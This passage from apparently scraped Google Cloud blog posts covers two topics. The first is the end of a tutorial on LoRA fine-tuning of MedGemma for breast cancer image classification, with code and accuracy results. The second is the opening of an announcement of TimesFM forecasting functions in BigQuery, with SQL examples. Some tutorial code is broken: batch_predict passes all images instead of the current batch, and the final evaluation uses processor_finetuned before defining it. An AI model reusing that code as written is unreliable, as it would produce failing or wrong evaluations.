optimized attention mechanism that's available in PyTorch 2.0. Think of this mechanism as telling the model to use a super-fast, built-in engine for its most important calculation. It speeds up training and inference, and it can even automatically use more advanced backends like FlashAttention if your hardware supports it.</span></p>\n</li>\n</ul></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;MODEL_ID = &quot;google/medgemma-4b-it&quot;\\r\\n\\r\\n# Model configuration\\r\\nmodel_kwargs = dict(\\r\\n    torch_dtype=torch.bfloat16,\\r\\n    device_map=&quot;auto&quot;,\\r\\n    attn_implementation=&quot;sdpa&quot;,\\r\\n)\\r\\n\\r\\nmodel = AutoModelForImageTextToText.from_pretrained(MODEL_ID, **model_kwargs)\\r\\nprocessor = AutoProcessor.from_pretrained(MODEL_ID)\\r\\n\\r\\n# Ensure right padding for training\\r\\nprocessor.tokenizer.padding_side = &quot;right&quot;&#x27;), (&#x27;language&#x27;, &#x27;lang-py&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f5bba700e20&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">Step 5: Evaluate the baseline model</span></h2>\n<p><span style=\"vertical-align: baseline;\">Before we invest time and compute in fine-tuning, let's see how the pre-trained model performs on its own. This step gives us a baseline to measure our improvement against.</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;# Helper functions to run evaluation\\r\\naccuracy_metric = evaluate.load(&quot;accuracy&quot;)\\r\\nf1_metric = evaluate.load(&quot;f1&quot;)\\r\\n\\r\\ndef compute_metrics(predictions, references):\\r\\n    return {\\r\\n        **accuracy_metric.compute(predictions=predictions, references=references),\\r\\n        **f1_metric.compute(predictions=predictions, references=references, average=&quot;weighted&quot;)\\r\\n    }\\r\\n\\r\\ndef postprocess_prediction(text):\\r\\n    &quot;&quot;&quot;Extract just the number from the model\\&#x27;s text output.&quot;&quot;&quot;\\r\\n    digit_match = re.search(r\\&#x27;\\\\b([0-7])\\\\b\\&#x27;, text.strip())\\r\\n    return int(digit_match.group(1)) if digit_match else -1\\r\\n\\r\\ndef batch_predict(model, processor, prompts, images, batch_size=8, max_new_tokens=40):\\r\\n    &quot;&quot;&quot;A function to run inference in batches.&quot;&quot;&quot;\\r\\n    predictions = []\\r\\n    for i in range(0, len(prompts), batch_size):\\r\\n        batch_texts = prompts[i:i + batch_size]\\r\\n        batch_images = [[img] for img in images[i:i + batch_size]]\\r\\n\\r\\n        inputs = processor(text=batch_texts, images=images, padding=True, return_tensors=&quot;pt&quot;).to(&quot;cuda&quot;, torch.bfloat16)\\r\\n        prompt_lengths = inputs[&quot;attention_mask&quot;].sum(dim=1)\\r\\n\\r\\n        with torch.inference_mode():\\r\\n            outputs = model.generate(**inputs, max_new_tokens=max_new_tokens, do_sample=False, pad_token_id=processor.tokenizer.pad_token_id)\\r\\n\\r\\n        for seq, length in zip(outputs, prompt_lengths):\\r\\n            generated = processor.decode(seq[length:], skip_special_tokens=True)\\r\\n            predictions.append(postprocess_prediction(generated))\\r\\n\\r\\n    return predictions\\r\\n\\r\\n# Prepare data for evaluation\\r\\neval_prompts = [processor.apply_chat_template([msg[0]], add_generation_prompt=True, tokenize=False) for msg in formatted_eval[&quot;messages&quot;]]\\r\\neval_images = formatted_eval[&quot;image&quot;]\\r\\neval_labels = formatted_eval[&quot;label&quot;]\\r\\n\\r\\n# Run baseline evaluation\\r\\nprint(&quot;Running baseline evaluation...&quot;)\\r\\nbaseline_preds = batch_predict(model, processor, eval_prompts, eval_images)\\r\\nbaseline_metrics = compute_metrics(baseline_preds, eval_labels)\\r\\n\\r\\nprint(f&quot;\\\\n{\\&#x27;BASELINE RESULTS\\&#x27;:-^80}&quot;)\\r\\nprint(f&quot;Accuracy: {baseline_metrics[\\&#x27;accuracy\\&#x27;]:.1%}&quot;)\\r\\nprint(f&quot;F1 Score: {baseline_metrics[\\&#x27;f1\\&#x27;]:.3f}&quot;)\\r\\nprint(&quot;-&quot; * 80)&#x27;), (&#x27;language&#x27;, &#x27;lang-py&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f5bba700940&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The performance of the baseline model was evaluated on both 8-class and binary (benign/malignant) classification:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">8-Class accuracy: 32.6%</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">8-Class F1 score (weighted): 0.241 </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Binary accuracy: 59.6%</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Binary F1 score (malignant): 0.639</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">This output shows that the model performs better than random chance </span><span style=\"vertical-align: baseline;\">(12.5%)</span><span style=\"vertical-align: baseline;\">, but there's significant room for improvement, especially in the fine-grained 8-class classification.</span></p>\n<h2><span style=\"vertical-align: baseline;\">A quick detour: Few-shot learning vs. fine-tuning</span></h2>\n<p><span style=\"vertical-align: baseline;\">Before we start training, it's worth asking: is fine-tuning the only way? Another popular technique is </span><em><strong style=\"vertical-align: baseline;\">few-shot learning</strong></em><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">Few-shot learning is like giving a smart student a few examples of a new math problem right before a test. You aren't re-teaching them algebra, you're just showing them the specific pattern you want them to follow by providing examples directly in the prompt. This is a powerful technique, especially when you're using a closed model through an API where you can't access the internal weights.</span></p>\n<p><span style=\"vertical-align: baseline;\">So why did we choose fine-tuning?</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">We can host the model:</strong><span style=\"vertical-align: baseline;\"> Because MedGemma is an open model, we have direct access to its architecture. This access lets us perform fine-tuning to create a new, permanently updated version of the model.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">We have a good dataset:</strong><span style=\"vertical-align: baseline;\"> Fine-tuning lets the model learn the deep, underlying patterns in our hundreds of training images far more effectively than just showing it a few examples in a prompt.</span></p>\n</li>\n</ol>\n<p><span style=\"vertical-align: baseline;\">In short, fine-tuning creates a true </span><strong style=\"vertical-align: baseline;\">specialist model</strong><span style=\"vertical-align: baseline;\"> for our task, which is exactly what we want.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Step 6: Configure and run fine-tuning with LoRA</span></h2>\n<p><span style=\"vertical-align: baseline;\">This is the main event! We'll use </span><strong style=\"vertical-align: baseline;\">Low-Rank Adaptation (LoRA)</strong><span style=\"vertical-align: baseline;\">, which is much faster and more memory-efficient than traditional fine-tuning. LoRA works by freezing the original model weights and training only a tiny set of new adapter weights. Here's a breakdown of our parameter choices:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><code><strong style=\"vertical-align: baseline;\">r=8</strong></code><span style=\"vertical-align: baseline;\"><strong>:</strong> The LoRA rank. A lower rank means fewer trainable parameters, which is faster but less expressive. A higher rank has more capacity, but risks overfitting on a small dataset. Rank 8 is a great starting point that balances performance and efficiency.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code><strong style=\"vertical-align: baseline;\">lora_alpha=16</strong></code><span style=\"vertical-align: baseline;\"><strong>:</strong> A scaling factor for the LoRA weights. A common rule of thumb is to set it to twice the rank (</span><span style=\"vertical-align: baseline;\">2 × r</span><span style=\"vertical-align: baseline;\">).</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code><strong style=\"vertical-align: baseline;\">lora_dropout=0.1</strong></code><span style=\"vertical-align: baseline;\"><strong>: </strong>A regularization technique. It randomly deactivates some LoRA neurons during training to prevent the model from becoming overly specialized and failing to generalize.</span></p>\n</li>\n</ul></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;# LoRA Configuration\\r\\npeft_config = LoraConfig(\\r\\n    r=8,\\r\\n    lora_alpha=16,\\r\\n    lora_dropout=0.1,\\r\\n    bias=&quot;none&quot;,\\r\\n    target_modules=&quot;all-linear&quot;,\\r\\n    task_type=&quot;CAUSAL_LM&quot;,\\r\\n)\\r\\n\\r\\n# Custom data collator to handle images and text\\r\\ndef collate_fn(examples):\\r\\n    texts, images = [], []\\r\\n    for example in examples:\\r\\n        images.append([example[&quot;image&quot;]])\\r\\n        texts.append(processor.apply_chat_template(example[&quot;messages&quot;], add_generation_prompt=False, tokenize=False).strip())\\r\\n    batch = processor(text=texts, images=images, return_tensors=&quot;pt&quot;, padding=True)\\r\\n    labels = batch[&quot;input_ids&quot;].clone()\\r\\n    labels[labels == processor.tokenizer.pad_token_id] = -100\\r\\n    image_token_id = processor.tokenizer.convert_tokens_to_ids(processor.tokenizer.special_tokens_map[&quot;boi_token&quot;])\\r\\n    labels[labels == image_token_id] = -100\\r\\n    labels[labels == 262144] = -100\\r\\n    batch[&quot;labels&quot;] = labels\\r\\n    return batch\\r\\n\\r\\n# Training arguments\\r\\ntraining_args = SFTConfig(\\r\\n    output_dir=&quot;medgemma-breastcancer-finetuned&quot;,\\r\\n    num_train_epochs=5,\\r\\n    per_device_train_batch_size=1,\\r\\n    per_device_eval_batch_size=1,\\r\\n    gradient_accumulation_steps=8,\\r\\n    gradient_checkpointing=True,\\r\\n    optim=&quot;paged_adamw_8bit&quot;,\\r\\n    learning_rate=5e-4,\\r\\n    lr_scheduler_type=&quot;cosine&quot;,\\r\\n    warmup_ratio=0.03,  # Warm up LR for first 3% of training\\r\\n    max_grad_norm=0.3,  # Clip gradients to prevent instability\\r\\n    bf16=True,  # Use bfloat16 precision\\r\\n    logging_steps=10,\\r\\n    save_strategy=&quot;steps&quot;,\\r\\n    save_steps=100,\\r\\n    eval_strategy=&quot;epoch&quot;,\\r\\n    push_to_hub=False,\\r\\n    report_to=&quot;none&quot;,\\r\\n    gradient_checkpointing_kwargs={&quot;use_reentrant&quot;: False},\\r\\n    dataset_kwargs={&quot;skip_prepare_dataset&quot;: True},\\r\\n    remove_unused_columns=False,\\r\\n    label_names=[&quot;labels&quot;], \\r\\n)\\r\\n\\r\\n# Initialize and run the trainer\\r\\ntrainer = SFTTrainer(\\r\\n    model=model,\\r\\n    args=training_args,\\r\\n    train_dataset=formatted_train,\\r\\n    eval_dataset=formatted_eval,\\r\\n    peft_config=peft_config,\\r\\n    processing_class=processor,\\r\\n    data_collator=collate_fn,\\r\\n)\\r\\n\\r\\nprint(&quot;Starting training...&quot;)\\r\\ntrainer.train()\\r\\ntrainer.save_model()&#x27;), (&#x27;language&#x27;, &#x27;lang-py&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f5b8b705910&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The training took about </span><strong style=\"vertical-align: baseline;\">80 minutes</strong><span style=\"vertical-align: baseline;\"> on the A100 GPU with VRAM 40 GB. The results looked promising, with the validation loss steadily decreasing.</span></p>\n<p><span style=\"vertical-align: baseline;\"><strong style=\"vertical-align: baseline;\">Important (time saving!) tip: </strong><span style=\"vertical-align: baseline;\">If your training gets interrupted for any reason (like a connection issue or exceeding resource limits), you can resume the training process from a saved checkpoint by using the </span><code style=\"vertical-align: baseline;\">resume_from_checkpoint</code><span style=\"vertical-align: baseline;\"> argument in </span><code><span style=\"vertical-align: baseline;\">trainer.train()</span></code><span style=\"vertical-align: baseline;\">. Checkpoints can save you valuable time because they're saved at every </span><code style=\"vertical-align: baseline;\">save_steps</code><span style=\"vertical-align: baseline;\"> interval as defined in </span><code style=\"vertical-align: baseline;\">TrainingArguments</code><span style=\"vertical-align: baseline;\">.</span></span></p>\n<h2><span style=\"vertical-align: baseline;\">Step 7: The final verdict - evaluating our fine-tuned model</span></h2>\n<p><span style=\"vertical-align: baseline;\">After training, it's time for the moment of truth. We'll load our new LoRA adapter weights, merge them with the base model, and then run the same evaluation that we ran for the baseline.</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;# Clear memory and load the final model\\r\\ndel model\\r\\ntorch.cuda.empty_cache()\\r\\ngc.collect()\\r\\n\\r\\n# Load base model again\\r\\nbase_model = AutoModelForImageTextToText.from_pretrained(\\r\\n    MODEL_ID,\\r\\n    torch_dtype=torch.bfloat16,\\r\\n    device_map=&quot;auto&quot;,\\r\\n    attn_implementation=&quot;sdpa&quot;\\r\\n)\\r\\n\\r\\n# Load LoRA adapters and merge them into a single model\\r\\nfinetuned_model = PeftModel.from_pretrained(base_model, training_args.output_dir)\\r\\nfinetuned_model = finetuned_model.merge_and_unload()\\r\\n\\r\\n# Configure for generation\\r\\nfinetuned_model.generation_config.max_new_tokens = 50\\r\\nfinetuned_model.generation_config.pad_token_id = processor_finetuned.tokenizer.pad_token_id\\r\\nfinetuned_model.config.pad_token_id = processor_finetuned.tokenizer.pad_token_id\\r\\n\\r\\n# Load the processor and run evaluation\\r\\nprocessor_finetuned = AutoProcessor.from_pretrained(training_args.output_dir)\\r\\nfinetuned_preds = batch_predict(finetuned_model, processor_finetuned, eval_prompts, eval_images, batch_size=4)\\r\\nfinetuned_metrics = compute_metrics(finetuned_preds, eval_labels)&#x27;), (&#x27;language&#x27;, &#x27;lang-py&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f5b8b705fd0&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Final results</strong></h3>\n<p>So, how did the fine tuning impact performance? Let's look at the numbers for 8-class accuracy and macro F1.</p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;--- 8-Class Classification (0-7) ---\\r\\nModel                Accuracy     F1 (Weighted)\\r\\n-----------------------------------------------\\r\\nBaseline                  32.6%         0.241\\r\\nFine-tuned                87.2%         0.865\\r\\n-----------------------------------------------\\r\\n\\r\\n--- Binary (Benign/Malignant) Classification ---\\r\\nModel                Accuracy     F1 (Malignant)\\r\\n-----------------------------------------------\\r\\nBaseline                  59.6%         0.639\\r\\nFine-tuned                99.0%         0.991\\r\\n-----------------------------------------------&#x27;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f5b8b705e50&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The results are great! After fine-tuning, we see a dramatic improvement:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\"><strong>8-Class</strong>: Accuracy jumped from 32.6% to 87.2% (+54.6%) and F1 from 0.241 to 0.865.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\"><strong>Binary</strong>: Accuracy increased from 59.6% to 99.0% (+39.4%) and F1 from 0.639 to 0.991. </span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">This project shows the incredible power of fine-tuning modern </span><a href=\"https://cloud.google.com/discover/what-are-foundation-models\"><span style=\"text-decoration: underline; vertical-align: baseline;\">foundation models.</span></a><span style=\"vertical-align: baseline;\"> We took a generalist AI that was already pre-trained on relevant medical data, gave it a small, specialized dataset, and taught it a new skill with remarkable efficiency. The journey from a generic model to a specialized classifier is more accessible than ever, opening up exciting possibilities for AI in medicine and beyond.</span></p>\n<p><span style=\"vertical-align: baseline;\">All of the information is available in the </span><a href=\"https://github.com/GoogleCloudPlatform/devrel-demos/blob/finetune_medgemma/ai-ml/finetune_medgemma/finetune_notebook.ipynb\" rel=\"noopener\" target=\"_blank\">Finetune Notebook</a><span style=\"vertical-align: baseline;\">. You can run it in with a GPU instance on </span><a href=\"https://cloud.google.com/vertex-ai-notebooks?utm_campaign=CDR_0x91b1edb5_default_b450564662&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Vertex AI Workbench</span></a><span style=\"vertical-align: baseline;\">. </span></p>\n<p><span style=\"vertical-align: baseline;\">Want to take it to production? Don't forget to catch the upcoming post, </span><span style=\"vertical-align: baseline;\">which shows you how to bring the fine tuning and evaluation to </span><a href=\"https://cloud.google.com/run/docs/create-jobs\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Cloud Run jobs</span></a><span style=\"vertical-align: baseline;\">.  </span></p>\n<p><span style=\"vertical-align: baseline;\">I hope this guide was helpful. Happy coding!</span></p>\n<p><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">Special thanks to </span><span style=\"vertical-align: baseline;\">Fereshteh Mahvar</span><span style=\"vertical-align: baseline;\"> and </span><span style=\"vertical-align: baseline;\">Dave Steiner</span><span style=\"vertical-align: baseline;\"> from the MedGemma team for their helpful review and feedback on this post. </span></span></p>\n<hr />\n<p><sup>1</sup> IEEE Transactions on Biomedical Engineering, vol. 63, no. 7, pp. 1455-1462, 2016</p></div>",
        "published_date": "2025-11-18 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/data-analytics/timesfm-models-in-bigquery-and-alloydb/",
        "title": "TimesFM in Data Cloud: The future of forecasting in BigQuery and AlloyDB",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/0_4pNkUXx.max-600x600.jpg",
        "author": "Tabatha (Tabby) Lewis-Simo",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">We are thrilled to announce the integration of </span><a href=\"https://research.google/blog/a-decoder-only-foundation-model-for-time-series-forecasting/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">TimesFM</span></a><span style=\"vertical-align: baseline;\"> into our leading data platforms, BigQuery and AlloyDB. This brings the power of large-scale, pre-trained forecasting models directly to your data within the Google Data Cloud, enabling you to predict future trends with unprecedented ease and accuracy.</span></p>\n<p><span style=\"vertical-align: baseline;\">TimesFM is a powerful time-series foundation model developed by Google Research, pre-trained on a vast dataset of over 400 billion real-world time-points. This extensive training allows TimesFM to perform \"zero-shot\" forecasting, meaning it can generate accurate predictions for your specific data without needing to be retrained. This dramatically simplifies the process of creating and deploying forecasting models, saving you time and resources.</span></p>\n<p><span style=\"vertical-align: baseline;\">Now, let's dive into what this means for you in BigQuery and AlloyDB.</span></p>\n<h2><strong style=\"vertical-align: baseline;\">TimesFM in BigQuery</strong></h2>\n<p><span style=\"vertical-align: baseline;\">We launched the AI.FORECAST function in preview at Google Cloud Next ‘25. Today, we are announcing: </span></p>\n<ul>\n<li><a href=\"https://cloud.google.com/bigquery/docs/reference/standard-sql/bigqueryml-syntax-ai-forecast\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">AI.FORECAST</strong></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://docs.cloud.google.com/bigquery/docs/reference/standard-sql/bigqueryml-syntax-ai-evaluate\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">AI.EVALUATE</strong></a><span style=\"vertical-align: baseline;\"> are now </span><strong style=\"vertical-align: baseline;\">Generally Available (GA).</strong></li>\n<li><a href=\"https://docs.cloud.google.com/bigquery/docs/reference/standard-sql/bigqueryml-syntax-ai-detect-anomalies\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">AI.DETECT_ANOMALIES</strong></a><span style=\"vertical-align: baseline;\"> is now in</span><strong style=\"vertical-align: baseline;\"> Public Preview.</strong></li>\n<li><span style=\"vertical-align: baseline;\">AI.FORECAST is supported in multiple open-source frameworks, including</span></li>\n<li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://google.github.io/adk-docs/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Agent Development Kit's</span></a><span style=\"vertical-align: baseline;\"> </span><a href=\"https://google.github.io/adk-docs/tools/built-in-tools/#bigquery\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">built-in tools</span></a></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://github.com/googleapis/genai-toolbox/tree/main/internal/tools/bigquery/bigqueryforecast\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">MCP toolbox</span></a></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://github.com/gemini-cli-extensions/bigquery-data-analytics\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini CLI extension</span></a><span style=\"vertical-align: baseline;\"> (</span><a href=\"https://cloud.google.com/blog/products/databases/gemini-cli-extensions-for-google-data-cloud?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">blogpost</span></a><span style=\"vertical-align: baseline;\">)</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://github.com/googleapis/python-bigquery-dataframes\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">BigQuery Dataframes</span></a><span style=\"vertical-align: baseline;\"> (</span><a href=\"https://github.com/googleapis/python-bigquery-dataframes/blob/main/notebooks/generative_ai/bq_dataframes_ai_forecast.ipynb\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">colab</span></a><span style=\"vertical-align: baseline;\">)</span></p>\n</li>\n</ul>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Let’s take a look at these in greater depth. </span></p>\n<h3><strong style=\"vertical-align: baseline;\">AI.FORECAST and AI.EVALUATE</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The GA launch includes major upgrades:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">TimesFM 2.5 is now supported</strong><span style=\"vertical-align: baseline;\">. </span><span style=\"vertical-align: baseline;\">By specifying `model =&gt; “TimesFM 2.5”`, you can use the latest TimesFM model to achieve better forecasting accuracy and lower latency.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">AI.FORECAST supports dynamic context windows up to 15K</strong><span style=\"vertical-align: baseline;\">: Multiple context windows from 64 to 15K are supported, by specifying `context_window`. If not specified, a context window is selected to match the time series input size.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">AI.FORECAST supports displaying historical data</strong><span style=\"vertical-align: baseline;\">:</span><span style=\"vertical-align: baseline;\"> Displaying historical data together with forecasts is supported by setting `output_historical_time_series` to true. The option enhances usability by enabling easier and better visualizations.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">We add </span><strong style=\"vertical-align: baseline;\">AI.EVALUATE for model evaluation.</strong><span style=\"vertical-align: baseline;\"> Users can specify the actual data to evaluate the accuracy of the forecasted value.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">In this example, you can use the TimesFM 2.5 model and specify the context window = 1024 in AI.FORECAST to use the latest 1024 points as the history data. You can specify output_historical_time_series = true to display historical data together with the forecasts.</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &quot;WITH citibike_trips AS (\\r\\n    SELECT EXTRACT(DATE FROM starttime) AS date, COUNT(*) AS num_trips\\r\\n    FROM `bigquery-public-data.new_york.citibike_trips` GROUP BY date)\\r\\nSELECT *\\r\\nFROM\\r\\n  AI.FORECAST(\\r\\n    TABLE citibike_trips,  -- History Table\\r\\n    data_col =&gt; &#x27;num_trips&#x27;,\\r\\n    timestamp_col =&gt; &#x27;date&#x27;,\\r\\n    horizon =&gt; 300,\\r\\n    output_historical_time_series =&gt; TRUE,\\r\\n    model =&gt; &#x27;TimesFM 2.5&#x27;,\\r\\n    context_window =&gt; 1024);&quot;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f5bc527c040&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The first 10 days forecasted values are:</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/1_UdEftix.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">You can also visualize the results by clicking the `Visualization` tab. The results should be similar to: </span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"2\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/2_VgpYZss.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">In this example of AI.EVALUATE, you can use the data before “2016-08-01” as history to evaluate the forecasted bike trips against the actual data after “2016-08-01”:</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;WITH citibike_trips AS (\\r\\n    SELECT EXTRACT(DATE FROM starttime) AS date, usertype, COUNT(*) AS num_trips\\r\\n    FROM `bigquery-public-data.new_york.citibike_trips` GROUP BY date, usertype)\\r\\nSELECT * \\r\\nFROM\\r\\n  AI.EVALUATE(\\r\\n    (SELECT * FROM citibike_trips WHERE date &lt; \\&#x27;2016-08-01\\&#x27;), -- History time series\\r\\n    (SELECT * FROM citibike_trips WHERE date &gt;= \\&#x27;2016-08-01\\&#x27;), -- Actual time series\\r\\n    data_col =&gt; \\&#x27;num_trips\\&#x27;,\\r\\n    timestamp_col =&gt; \\&#x27;date\\&#x27;,\\r\\n    id_cols =&gt; [&quot;usertype&quot;]);&#x27;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f5bc527ce20&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The SQL generates evaluation metrics based on each `usertype`: </span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"3\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/3_N4KkI4x.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">AI.DETECT_ANOMALIES</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The addition of </span><strong style=\"vertical-align: baseline;\">AI.DETECT_ANOMALIES </strong><span style=\"vertical-align: baseline;\">lets you specify the target data to detect anomalies against the forecasted value.</span><span style=\"vertical-align: baseline;\"> </span></p>\n<p><span style=\"vertical-align: baseline;\">In this example of AI.DETECT_ANOMALIES, you can use the data before “2016-08-01” as history to detect anomalies in the target data after “2016-08-01”:</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;WITH citibike_trips AS (\\r\\n    SELECT EXTRACT(DATE FROM starttime) AS date, usertype, COUNT(*) AS num_trips\\r\\n    FROM `bigquery-public-data.new_york.citibike_trips` GROUP BY date, usertype)\\r\\nSELECT * \\r\\nFROM\\r\\n  AI.DETECT_ANOMALIES(\\r\\n    (SELECT * FROM citibike_trips WHERE date &lt; \\&#x27;2016-08-01\\&#x27;), -- History time series \\r\\n    (SELECT * FROM citibike_trips WHERE date &gt;= \\&#x27;2016-08-01\\&#x27;), -- Target time series\\r\\n    data_col =&gt; \\&#x27;num_trips\\&#x27;,\\r\\n    timestamp_col =&gt; \\&#x27;date\\&#x27;,\\r\\n    id_cols =&gt; [&quot;usertype&quot;]);&#x27;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f5bc527cb50&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The SQL generates the anomalies per usertype for each data point that is after “2016-08-01”, an example of 10 rows of results are:</span></p></div>\n<div 